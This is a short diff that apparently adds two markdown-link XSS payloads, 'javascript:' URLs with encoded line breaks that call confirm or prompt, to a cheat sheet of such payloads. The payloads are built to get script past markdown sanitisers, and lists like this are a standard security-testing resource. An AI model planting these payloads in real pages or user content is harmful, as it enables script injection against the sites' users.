@@ -103,12 +103,21 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 ```
 
 ```md
+[a](javascript://%0d%0aconfirm(1))
+```
+
+```md
 [a](javascript://%0d%0aconfirm(1);com)
 ```
 
 ```md
 [a](javascript:window.onerror=confirm;throw%201)
 ```
+
+```md
+[a]: (javascript:prompt(1))
+```
+
 
 **Flash SWF XSS**
 
